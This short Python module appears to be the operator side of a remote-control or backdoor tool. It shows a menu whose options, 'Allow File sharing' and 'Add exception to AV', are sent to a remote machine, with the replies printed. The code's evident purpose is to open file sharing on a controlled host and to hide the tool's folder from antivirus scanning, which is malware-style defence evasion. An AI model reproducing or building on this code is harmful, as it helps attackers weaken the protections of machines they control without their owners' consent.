from core.utils import clear_screen, display_msg
import time
def firewall_options():
    clear_screen()
    display_msg("[ 01 ] Allow File sharing")
    display_msg("[ 02 ] Add exception to AV")


def modify_firewall(server):
    # print("modifying firewall")
    firewall_options()
    f_opt = input("Select the option you want to select :")
    server.send_data(f_opt)

    if f_opt == "1":
        display_msg("Enabling File sharing")
        print(server.receive_data())
    elif f_opt == "2":
        display_msg("Adding current folder to exception")
        print(server.receive_data())
    else:
        print("invalid option")
        time.sleep(2)
